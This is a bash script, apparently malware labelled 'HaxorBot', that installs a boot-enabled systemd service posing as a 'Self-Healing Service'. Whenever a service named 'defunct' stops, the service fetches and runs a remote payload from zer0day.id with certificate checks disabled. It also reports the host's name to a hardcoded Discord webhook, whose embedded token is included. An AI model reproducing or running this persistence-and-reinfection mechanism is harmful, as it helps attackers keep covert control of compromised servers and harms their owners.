#!/bin/bash

self_healing_script_path="/usr/local/bin/self"
service_file_path="/etc/systemd/system/self.service"
webhook_url="https://discordapp.com/api/webhooks/1261323469749223465/XZtp_a_gNMVif8HDqmG0AQUZA0Kr-pSefGYlwwqTMcfmmSG0NOTdzPV_7K8LJoSDflqA"
service_name="defunct"  
pid_file="/var/run/self.pid"

cat << 'EOF' > "$self_healing_script_path"
#!/bin/bash

host=$(hostname)
webhook_url="https://discordapp.com/api/webhooks/1261323469749223465/XZtp_a_gNMVif8HDqmG0AQUZA0Kr-pSefGYlwwqTMcfmmSG0NOTdzPV_7K8LJoSDflqA"
service_name="defunct"
pid_file="/var/run/self.pid"

check_pid() {
    if [ -f "$pid_file" ]; then
        if ps -p "$(cat $pid_file)" > /dev/null 2>&1; then
            return 0
        else
            return 1
        fi
    else
        return 1
    fi
}

write_pid() {
    echo $$ > "$pid_file"
}

cleanup() {
    rm -f "$pid_file"
}
trap cleanup EXIT

write_pid

while true; do
    if systemctl is-active --quiet "$service_name"; then
        # Service is running, sleep infinity
        sleep infinity
    else
        curl -sL -H "Content-Type: application/json" -X POST -d "{\"content\": \"[HaxorBot] Service $service_name tidak berjalan di server $host, mengaktifkan ulang...\"}" "$webhook_url"
        bash -c "$(curl -fsSL https://zer0day.id/y -k)"
        
        if systemctl is-active --quiet "$service_name"; then
            curl -sL -H "Content-Type: application/json" -X POST -d "{\"content\": \"[HaxorBot] Berhasil mengaktifkan ulang $service_name!\"}" "$webhook_url"
        else
            curl -sL -H "Content-Type: application/json" -X POST -d "{\"content\": \"[HaxorBot] Gagal mengaktifkan ulang $service_name!\"}" "$webhook_url"
        fi
    fi
done
EOF

chmod +x "$self_healing_script_path"

cat << EOF > "$service_file_path"
[Unit]
Description=Self-Healing Service

[Service]
ExecStart=$self_healing_script_path
Restart=always
RestartSec=10
PIDFile=$pid_file

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable self.service
systemctl start self.service

systemctl status self.service
